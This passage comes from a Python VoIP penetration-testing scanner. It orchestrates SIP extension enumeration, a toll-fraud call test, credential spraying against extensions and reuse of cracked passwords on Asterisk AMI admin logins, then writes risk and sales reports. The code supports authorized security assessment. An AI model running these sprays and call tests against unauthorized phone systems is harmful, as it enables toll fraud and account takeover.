                      f"{_weak_lines}", col)
                if len(_weak_lines) > 1:
                    _finding("high",
                             f"WEAK LINES: PBX routes unauthenticated calls from "
                             f"{len(_weak_lines)} distinct extensions — "
                             f"any SIP device on the network is a toll-fraud launch point: "
                             f"{_weak_lines}",
                             col)

            if result.success:
                _finding("critical",
                         f"TOLL FRAUD CONFIRMED — call placed to {effective_call_to}  "
                         f"{result.status_code} {result.reason}", col)
            elif result.reached_dialplan:
                _finding("high",
                         f"Dialplan engaged — PBX accepted INVITE and started routing  "
                         f"{result.status_code} {result.reason}", col)
            else:
                _info(f"Call rejected — {result.status_code} {result.reason}", col)

            if result.srtp_state == "downgraded":
                _finding("medium",
                         "SRTP downgrade: PBX silently accepted cleartext media when SRTP was offered",
                         col)


        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 5 · EXTENSION ENUMERATION  [{h.ip}]", col)

        ami_dumped_exts: list[str] = (hr.get("ami") or {}).get("extensions") or []

        # In --auto mode, use platform-specific extension ranges after fingerprinting
        if args.auto and not args.ext_range and ami_dumped_exts == []:
            auto_ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
            _info(
                f"AUTO mode: using platform-specific ranges for {h.fingerprint}: {auto_ranges}",
                col,
            )

        if args.enum:
            if ami_dumped_exts:
                # AMI gave us ground truth — skip wordlist
                ext_list = ami_dumped_exts
                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
                _jitter_sleep(args.jitter)
                found = enumeration.sweep(
                    h.ip, ext_list, port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
            elif args.ext_range:
                ext_list = enumeration.expand_ext_range(args.ext_range)
                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
                prog = Progress("REGISTER sweep", len(ext_list), col)
                _jitter_sleep(args.jitter)
                found = enumeration.sweep(
                    h.ip, ext_list, port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log, progress_cb=prog.tick,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
                prog.close()
            else:
                # Auto-select ranges based on fingerprint (full mode) or wordlist
                if args.full:
                    ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
                    found_all: list[enumeration.ExtensionResult] = []
                    seen_exts: set[str] = set()

                    # Pass 1: special / feature-code extensions
                    specials = enumeration.SPECIAL_EXTENSIONS[:]
                    _jitter_sleep(args.jitter)
                    sf = enumeration.sweep(
                        h.ip, specials, port=sip_port,
                        timeout=args.timeout, max_workers=args.workers,
                        traffic_log=traffic_log,
                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    )
                    for r in sf:
                        if r.extension not in seen_exts:
                            seen_exts.add(r.extension)
                            found_all.append(r)
                    if sf:
                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)

                    # Pass 2: priority extensions — 1000+ most common across all
                    # brands, probed before the adaptive sweep to surface hits fast
                    prio_path = os.path.join(
                        os.path.dirname(__file__),
                        "wordlists", "extensions_priority.txt"
                    )
                    if os.path.exists(prio_path):
                        with open(prio_path) as _pf:
                            prio_list = [
                                ln.strip() for ln in _pf
                                if ln.strip() and not ln.startswith("#")
                                and ln.strip() not in seen_exts
                            ]
                        _info(f"Priority sweep: {len(prio_list)} common extensions "
                              f"({h.fingerprint} platform)...", col)
                        prog = Progress("Priority sweep", len(prio_list), col)
                        _jitter_sleep(args.jitter)
                        pf = enumeration.sweep(
                            h.ip, prio_list, port=sip_port,
                            timeout=args.timeout, max_workers=args.workers,
                            traffic_log=traffic_log, progress_cb=prog.tick,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                        )
                        prog.close()
                        for r in pf:
                            if r.extension not in seen_exts:
                                seen_exts.add(r.extension)
                                found_all.append(r)
                        if pf:
                            _ok(f"Priority hits: {[r.extension for r in pf]}", col)

                    # Pass 3: adaptive sweep over 100-5000 to fill gaps
                    _info(f"Fingerprint: {h.fingerprint} — adaptive sweep "
                          f"over ranges {ranges} (filling gaps)...", col)
                    for (lo, hi) in ranges:
                        total_coarse = (hi - lo) // 10 + 1
                        _info(f"Adaptive sweep {lo}–{hi} (~{total_coarse} coarse probes)...", col)
                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
                        _jitter_sleep(args.jitter)
                        batch = enumeration.adaptive_sweep(
                            h.ip, port=sip_port, low=lo, high=hi,
                            timeout=args.timeout, max_workers=args.workers,
                            traffic_log=traffic_log, progress_cb=prog.tick,
                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                        )
                        prog.close()
                        for r in batch:
                            if r.extension not in seen_exts:
                                seen_exts.add(r.extension)
                                found_all.append(r)

                    found = found_all
                else:
                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
                    prog = Progress("REGISTER sweep", len(ext_list), col)
                    _jitter_sleep(args.jitter)
                    found = enumeration.sweep(
                        h.ip, ext_list, port=sip_port,
                        timeout=args.timeout, max_workers=args.workers,
                        traffic_log=traffic_log, progress_cb=prog.tick,
                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    )
                    prog.close()

            # INVITE-probe found extensions for anonymous-call acceptance
            if found:
                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
                prog2 = Progress("INVITE probe", len(found), col)
                _jitter_sleep(args.jitter)
                inv_map = enumeration.probe_invite_acceptance(
                    h.ip, [r.extension for r in found], port=sip_port,
                    timeout=args.timeout, max_workers=args.workers,
                    traffic_log=traffic_log, progress_cb=prog2.tick,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                )
                prog2.close()
                for r in found:
                    inv = inv_map.get(r.extension)
                    if inv:
                        r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
                        r.auth_required = r.auth_required and inv.auth_required

            hr["extensions"] = [asdict(x) for x in found]
            anon = sum(1 for x in found if x.anonymous_invite)
            open_reg = sum(1 for x in found if x.open_register)
            _ok(f"{len(found)} extension(s) found — "
                f"auth_required:{len(found)-anon}  "
                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
                col)
            for r in found:
                flags = []
                if r.anonymous_invite:
                    flags.append(f"{col.RED}anon-invite{col.RESET}")
                if r.open_register:
                    flags.append(f"{col.RED}open-register{col.RESET}")
                if r.auth_required:
                    flags.append("auth-required")
                _info(f"  ext {col.BOLD}{r.extension}{col.RESET}  " + "  ".join(flags), col)
            if not found and args.call_test:
                _warn("0 extensions enumerated — PBX may suppress REGISTER probes or use "
                      "a non-standard range. Phase 6 will probe for ANONYMOUS DIAL-OUT: "
                      "whether the PBX routes PSTN calls from completely unknown/unregistered "
                      "extensions with no credentials.", col)


        # ══════════════════════════════════════════════════════════════════
        _phase(f"PHASE 6 · CREDENTIAL SPRAY  [{h.ip}]", col)


        if args.spray and hr["extensions"]:
            creds = auth.load_credentials(args.cred_file)
            if args.grandstream_creds or h.fingerprint == "Grandstream":
                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
                if os.path.exists(gs_path):
                    creds.extend(auth.load_credentials(gs_path))
            targets_for_spray = [e["extension"] for e in hr["extensions"]
                                  if e.get("auth_required")]
            if targets_for_spray:
                total_attempts = len(creds) * len(targets_for_spray)
                _info(f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
                      f"extension(s) = {total_attempts} attempts (max-failures={args.max_failures_per_ext})...", col)
                prog = Progress("Spray", len(targets_for_spray), col)
                _jitter_sleep(args.jitter)
                ami_pwds = []
                if hr.get("ami") and hr["ami"].get("success") and hr["ami"].get("password"):
                    ami_pwds = [hr["ami"]["password"]]
                hits_spray = auth.spray(
                    h.ip, targets_for_spray, creds,
                    port=sip_port, timeout=args.timeout,
                    max_workers=min(args.workers, 10),
                    max_failures_per_ext=args.max_failures_per_ext,
                    traffic_log=traffic_log,
                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                    ami_cracked_passwords=ami_pwds,
                )
                prog.close()
                successes = [asdict(c) for c in hits_spray if c.success]
                hr["credentials_found"] = successes
                if successes:
                    for c in successes:
                        _finding("critical",
                                 f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
                                 f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
                                 col)
                else:
                    _info("No credentials cracked.", col)

                # Credential reuse: try cracked SIP passwords against AMI
                if successes and hr.get("ami") and not hr["ami"].get("success"):
                    _sip_passwords = list({c["password"] for c in successes if c.get("password")})
                    if _sip_passwords:
                        _info(f"Credential reuse: trying {len(_sip_passwords)} cracked SIP password(s) against AMI...", col)
                        from scanner import ami as _ami
                        for _pwd in _sip_passwords[:5]:
                            for _user in ["admin", "asterisk", successes[0].get("username", "admin")]:
                                _reuse = _ami.try_login(h.ip, _user, _pwd, port=5038, timeout=args.timeout)
                                if _reuse and _reuse.get("success"):
                                    _warn(f"AMI credential reuse: SIP password '{_pwd}' works on AMI as '{_user}'!", col)
                                    hr["ami"]["reuse_hit"] = {"username": _user, "password": _pwd}
                                    _finding("critical", f"CREDENTIAL REUSE: SIP password '{_pwd}' grants AMI access as '{_user}' — full PBX control", col)
                                    break

                # --auto: also try INVITE-based auth spray for extensions that only
                # challenge INVITE (some PBXes skip REGISTER challenge)
                if args.auto and not successes:
                    invite_auth_exts = [
                        e["extension"] for e in hr["extensions"]
                        if e.get("auth_required")
                    ]
                    if invite_auth_exts:
                        _info(
                            f"AUTO mode: trying INVITE-based auth spray on "
                            f"{len(invite_auth_exts)} extension(s) "
                            f"(some PBXes only challenge INVITE, not REGISTER)...",
                            col,
                        )
                        _jitter_sleep(args.jitter)
                        try:
                            invite_hits = auth.spray(
                                h.ip, invite_auth_exts, creds,
                                port=sip_port, timeout=args.timeout,
                                max_workers=min(args.workers, 10),
                                max_failures_per_ext=args.max_failures_per_ext,
                                traffic_log=traffic_log,
                                source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
                                method="INVITE",
                            )
                            invite_successes = [asdict(c) for c in invite_hits if c.success]
                            if invite_successes:
                                hr["credentials_found"].extend(invite_successes)
                                for c in invite_successes:
                                    _finding(
                                        "critical",
                                        f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
                                        f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
                                        col,
                                    )
                            else:
                                _info("INVITE-based auth spray: no additional credentials found.", col)
                        except TypeError:
                            # auth.spray() may not support method= in all builds
                            _info("INVITE auth spray not supported in this build — skipping.", col)
            else:
                _info("No auth-required extensions to spray.", col)
        elif args.spray:
            _info("No extensions found — skipping credential spray.", col)


        host_reports.append(hr)

    # ══════════════════════════════════════════════════════════════════════
    _phase("REPORT", col)

    final_report = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
        "operator": operator,
        "target": args.target,
        "scope_file": args.scope_file or "",
        "scope_sha256": scope_sha or "",
        "args": {k: v for k, v in vars(args).items()
                 if not callable(v) and not k.startswith("_")},
        "hosts": host_reports,
    }
    paths = report.write_all(report_dir, final_report)
    traffic_log.close()

    counts = final_report.get("severity_counts", {})

    # risk_score is stored as an int by write_all(); normalise to dict for display
    _rs_raw = final_report.get("risk_score", 0)
    if isinstance(_rs_raw, dict):
        rs = _rs_raw
    else:
        _score_int = int(_rs_raw) if _rs_raw else 0
        rs = {
            "score": _score_int,
            "band": (
                "CRITICAL" if _score_int >= 75 else
                "HIGH"     if _score_int >= 50 else
                "MEDIUM"   if _score_int >= 25 else
                "LOW"
            ),
        }

    # toll_fraud_estimate uses monthly_estimate_usd; map to display keys
    _tf_raw = final_report.get("toll_fraud_estimate", {})
    if _tf_raw and "high_usd" not in _tf_raw:
        _monthly = _tf_raw.get("monthly_estimate_usd", 0)
        tf = {
            "high_usd": int(_monthly * 1.5),
            "low_usd": int(_monthly * 0.5),
            "proven": _tf_raw.get("risk_level", "LOW") == "CRITICAL",
            "scenario": _tf_raw.get("calculation_basis", ""),
        }
    else:
        tf = _tf_raw

    # Findings summary banner
    print()
    print(f"  {'─' * 60}")
    print(f"  {'FINDINGS SUMMARY':^60}")
    print(f"  {'─' * 60}")
    for sev in ("critical", "high", "medium", "low", "info"):
        n = counts.get(sev, 0)
        if n == 0:
            continue
        bar = "█" * min(n, 30)
        print(f"  {col.for_severity(sev)}{sev.upper():8}{col.RESET}  {bar} {n}")
    print(f"  {'─' * 60}")

    # Risk score — displayed prominently
    if rs:
        score = rs.get("score", 0)
        band = rs.get("band", "")
        band_col = col.for_severity(
            "critical" if score >= 75 else
            "high"     if score >= 50 else
            "medium"   if score >= 25 else "info"
        )
        print()
        _info(
            f"RISK SCORE: {band_col}{col.BOLD}{score}/100 [{band}]{col.RESET}",
            col,
        )

    # Toll-fraud exposure — displayed prominently
    if tf and tf.get("high_usd", 0) > 0:
        proven = tf.get("proven", False)
        low_usd = tf.get("low_usd", 0)
        high_usd = tf.get("high_usd", 0)
        proven_label = (f"{col.RED}PROVEN{col.RESET}" if proven
                        else f"{col.YELLOW}ESTIMATED{col.RESET}")
        def _fmt_usd(v: int) -> str:
            if v >= 10000:
                return f"${v // 1000}k"
            return f"${v:,}"
        _warn(
            f"Estimated monthly exposure: {_fmt_usd(low_usd)}–{_fmt_usd(high_usd)}  "
            f"[{proven_label}]",
            col,
        )
        if tf.get("scenario"):
            print(f"  {tf['scenario']}")

    print(f"\n  {'─' * 60}")
    print()
    for k, pth in paths.items():
        if k == "findings":
            label = "findings (actionable)"
        elif k == "sales_brief":
            label = "sales brief (client)"
        else:
            label = k
        _ok(f"{label:<26} : {pth}", col)

    # sales_brief.html path
    sales_brief_path = os.path.join(report_dir, "sales_brief.html")
    if os.path.exists(sales_brief_path):
        _ok(f"{'sales_brief':<26} : {sales_brief_path}", col)

    _ok(f"{'traffic':<26} : {os.path.join(report_dir, 'traffic.log')}", col)
    print()

    return 0


if __name__ == "__main__":
    sys.exit(main())
